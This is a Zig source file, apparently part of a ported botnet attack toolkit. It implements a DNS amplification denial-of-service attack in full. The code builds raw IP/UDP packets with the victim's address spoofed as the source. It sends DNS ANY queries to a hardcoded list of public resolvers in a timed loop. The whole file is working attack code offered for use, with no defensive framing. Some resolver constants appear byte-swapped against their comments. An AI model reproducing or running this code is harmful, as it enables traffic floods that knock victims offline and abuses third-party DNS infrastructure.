//! # DNS Amplification Attack
//!
//! Sends spoofed DNS ANY queries to open resolvers, amplifying traffic to victim.
//!
//! ## C Reference: modules/attack/methods/dns.c (97 lines)

const std = @import("std");
const posix = std.posix;
const crypto = @import("../crypto/mod.zig");

const IPPROTO_UDP: u8 = 17;
const DNS_PORT: u16 = 53;

// ============================================================
// DNS ROOT QUERY PAYLOAD (from C: dns.c lines 18-23)
// ============================================================
// Header: ID(2), Flags(2), QCount(2), ACount(2), Auth(2), Add(2)
// Query: Root(1), Type ANY(2), Class IN(2)

const dns_payload = [_]u8{
    0x12, 0x34, // Transaction ID (will be randomized)
    0x01, 0x00, // Flags: Standard query
    0x00, 0x01, // Questions: 1
    0x00, 0x00, // Answers: 0
    0x00, 0x00, // Authority: 0
    0x00, 0x00, // Additional: 0
    0x00, // Root domain (empty)
    0x00, 0xff, // Type: ANY
    0x00, 0x01, // Class: IN
};

// ============================================================
// OPEN RESOLVERS (from C: dns.c lines 26-36)
// ============================================================

const resolvers = [_]u32{
    0x08080808, // 8.8.8.8 (Google)
    0x08080404, // 8.8.4.4 (Google)
    0x01010101, // 1.1.1.1 (Cloudflare)
    0x01000001, // 1.0.0.1 (Cloudflare)
    0x09090909, // 9.9.9.9 (Quad9)
    0xDEDEC3D0, // 208.67.222.222 (OpenDNS)
    0xDCDEC3D0, // 208.67.220.220 (OpenDNS)
    0x01020204, // 4.2.2.1 (Level3)
    0x02020204, // 4.2.2.2 (Level3)
};

// ============================================================
// IP + UDP HEADERS
// ============================================================

const IpHeader = packed struct {
    version_ihl: u8,
    tos: u8,
    tot_len: u16,
    id: u16,
    frag_off: u16,
    ttl: u8,
    protocol: u8,
    check: u16,
    saddr: u32,
    daddr: u32,
};

const UdpHeader = packed struct {
    sport: u16,
    dport: u16,
    len: u16,
    check: u16,
};

// ============================================================
// DNS AMPLIFICATION (from C: dns.c attack_dns lines 38-96)
// ============================================================

pub fn attackDns(victim_ip: u32, _: u16, duration: u32) void {
    // Create raw socket (from C: lines 41-45)
    const sock = posix.socket(posix.AF.INET, posix.SOCK.RAW, IPPROTO_UDP) catch return;
    defer posix.close(sock);

    const one: i32 = 1;
    const IP_HDRINCL = 3;
    posix.setsockopt(sock, posix.IPPROTO.IP, IP_HDRINCL, std.mem.asBytes(&one)) catch {};

    var rng = crypto.FastRandom.init(@truncate(@as(u64, @bitCast(std.time.timestamp()))));

    const end_time = std.time.timestamp() + duration;

    // Packet: IP(20) + UDP(8) + DNS(17) = 45 bytes
    const PACKET_SIZE = 45;

    while (std.time.timestamp() < end_time) {
        // Round robin through resolvers (from C: lines 70-93)
        for (resolvers) |resolver_ip| {
            var packet: [PACKET_SIZE]u8 = undefined;
            @memset(&packet, 0);

            // IP Header (from C: lines 54-64)
            const iph = @as(*IpHeader, @ptrCast(@alignCast(&packet)));
            iph.version_ihl = 0x45;
            iph.tos = 0;
            iph.tot_len = std.mem.nativeToBig(u16, PACKET_SIZE);
            iph.id = std.mem.nativeToBig(u16, @truncate(rng.next()));
            iph.frag_off = 0;
            iph.ttl = 255;
            iph.protocol = IPPROTO_UDP;
            iph.saddr = victim_ip; // SPOOFED
            iph.daddr = resolver_ip;
            iph.check = 0;
            iph.check = crypto.internetChecksum(packet[0..20]);

            // UDP Header (from C: lines 79-82)
            const udph = @as(*UdpHeader, @ptrCast(@alignCast(packet[20..].ptr)));
            udph.sport = std.mem.nativeToBig(u16, @truncate(rng.next()));
            udph.dport = std.mem.nativeToBig(u16, DNS_PORT);
            udph.len = std.mem.nativeToBig(u16, 8 + dns_payload.len);
            udph.check = 0;

            // Copy DNS payload (from C: lines 84-85)
            @memcpy(packet[28..45], &dns_payload);

            // Randomize transaction ID (from C: lines 88-90)
            const tx_id: u16 = @truncate(rng.next());
            packet[28] = @truncate(tx_id >> 8);
            packet[29] = @truncate(tx_id);

            // Send (from C: line 92)
            var dest: posix.sockaddr.in = .{
                .family = posix.AF.INET,
                .port = std.mem.nativeToBig(u16, DNS_PORT),
                .addr = resolver_ip,
            };

            _ = posix.sendto(sock, &packet, 0, @ptrCast(&dest), @sizeOf(posix.sockaddr.in)) catch {};
        }
    }
}
